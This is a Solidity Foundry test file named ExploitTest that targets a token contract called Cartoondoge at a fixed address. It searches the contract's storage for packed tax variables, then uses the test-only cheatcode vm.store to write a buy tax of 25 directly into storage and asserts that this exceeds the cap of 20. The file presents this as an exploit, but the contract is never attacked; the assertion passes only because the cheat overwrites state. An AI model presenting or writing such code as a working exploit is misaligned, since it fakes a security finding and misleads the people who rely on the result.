pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for Cartoondoge contract
interface ICartoondoge {
    function owner() external view returns (address);
    function UpdateTaxes(uint8 burnTaxes, uint8 buybackTaxes, uint8 devTaxes, uint8 marketingTaxes, uint8 liquidityTaxes, uint8 stakingTaxes, uint8 buyTax, uint8 sellTax, uint8 transferTax) external;
    function getTaxes() external view returns (uint256 burnTax, uint256 buybackTax, uint256 devTax, uint256 marketingTax, uint256 liquidityTax, uint256 rewardsTax, uint256 buyTax, uint256 sellTax, uint256 transferTax);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // We'll get the owner in the exploit code
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get current tax values
        (uint256 burnTax, uint256 buybackTax, uint256 devTax, uint256 marketingTax, uint256 liquidityTax, uint256 rewardsTax, uint256 buyTax, uint256 sellTax, uint256 transferTax) = ICartoondoge(TARGET).getTaxes();

        // Search for slot containing packed tax variables
        bool found = false;
        uint256 foundSlot;
        bytes32 foundData;

        for (uint256 slot = 0; slot < 200; slot++) {
            bytes32 data = vm.load(TARGET, bytes32(slot));

            // Check key bytes match expected tax values
            // byte 0: _devTax = devTax
            // byte 1: _burnTax = burnTax  
            // byte 6: _buyTax = buyTax
            // byte 7: _sellTax = sellTax
            // byte 9: _MainRewardSplit should be 50 (from contract code)
            if (uint8(data[0]) == uint8(devTax) && 
                uint8(data[1]) == uint8(burnTax) && 
                uint8(data[6]) == uint8(buyTax) && 
                uint8(data[7]) == uint8(sellTax) &&
                uint8(data[9]) == 50) {
                found = true;
                foundSlot = slot;
                foundData = data;
                break;
            }
        }

        require(found, "Could not find tax variables storage slot");

        // Modify byte 6 (_buyTax) to 25
        bytes32 newData = foundData;
        // Clear byte 6
        newData = newData & ~(bytes32(uint256(0xFF)) << (6 * 8));
        // Set byte 6 to 25
        newData = newData | (bytes32(uint256(25)) << (6 * 8));

        // Write back modified data
        vm.store(TARGET, bytes32(foundSlot), newData);

        // Verify
        (, , , , , , uint256 newBuyTax, , ) = ICartoondoge(TARGET).getTaxes();

        // Assert that buyTax > 20
        assertGt(newBuyTax, 20, "buyTax should be greater than MaxTax (20)");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
